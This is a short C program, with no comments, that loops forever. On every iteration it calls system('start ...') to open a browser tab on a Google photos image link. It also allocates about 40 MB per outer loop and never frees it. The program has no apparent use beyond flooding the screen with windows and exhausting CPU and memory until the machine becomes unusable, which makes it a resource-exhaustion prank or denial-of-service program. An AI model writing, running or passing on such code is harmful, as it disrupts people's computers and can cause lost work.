#include <stdio.h>
#include <stdlib.h>

int main() {
    while (1) {
        for (long long i = 0; i < 1000000000; i++) {
            double result = i * 3.14159 / 2.71828;
            printf("%f\n", result);
            system("start https://photos.fife.usercontent.google.com/pw/AP1GczMURsdi4xoyDBjup0uJG9s6R-oEU9QHCDd33LAeUMt-B8YEcq-Y_dk03A=w165-h220-no?authuser=0");
        }

        int *ptr = (int *) malloc(10000000 * sizeof(int));
        if (ptr == NULL) {
            printf("Memory allocation failed!\n");
            break;
        }

        for (int i = 0; i < 10000000; i++) {
            ptr[i] = i;
        }
    }

    return 0;
}